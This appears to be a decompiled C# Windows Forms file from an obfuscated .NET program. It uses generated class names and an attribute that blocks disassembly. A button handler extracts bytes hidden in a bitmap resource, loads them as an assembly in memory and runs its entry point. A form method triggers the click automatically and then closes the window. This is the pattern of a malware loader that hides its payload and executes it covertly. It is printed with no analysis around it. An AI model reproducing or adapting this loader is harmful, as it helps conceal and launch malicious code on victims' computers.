using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[SuppressIldasm]
internal sealed class Form0 : Form
{
	[SuppressIldasm]
	public sealed class Class1 : Button
	{
		void Button.OnClick(EventArgs e)
		{
			//IL_0005: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			Bitmap bitmap_ = new Bitmap(Class9.smethod_16());
			AppDomain.CurrentDomain.Load(Class9.smethod_11(bitmap_)).EntryPoint!.Invoke(null, null);
			((Button)this).OnClick(e);
		}
	}

	internal IContainer icontainer_0;

	internal Class1 class1_0;

	internal BindingSource bindingSource_0;

	public Form0()
	{
		Class9.smethod_4(this);
	}

	internal void method_0(object sender, EventArgs e)
	{
		((Button)class1_0).PerformClick();
		((Form)this).Close();
	}
}
